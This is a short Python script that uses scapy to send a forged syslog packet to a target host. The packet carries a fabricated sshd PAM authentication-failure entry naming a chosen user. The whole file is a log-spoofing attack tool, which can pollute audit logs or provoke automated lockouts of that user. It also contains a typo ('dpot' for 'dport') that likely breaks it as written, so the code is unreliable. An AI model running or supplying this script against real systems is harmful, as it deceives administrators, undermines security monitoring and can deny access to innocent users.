#!/usr/bin/env python3
# Usage statement
# usage: fakeSyslog.py target user
# Import our libraries
from scapy.all import *
import time
# Define our variables
tgt = sys.argv[1]
user = sys.argv[2]

myTime = time.strftime("%b %d %H:%M:%S")
myPri = 85
ip = IP (dst=tgt)
udp = UDP (dpot=514, sport=45679)
myMsg = " pam_unix(sshd:auth) : authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=::1  " +  "user=" + user
raw=Raw(load="<" + str(myPri) + ">" + myTime + myMsg)

# Assemble our packet
p = ip/udp/raw

# Send our packet
send(p,verbose=0)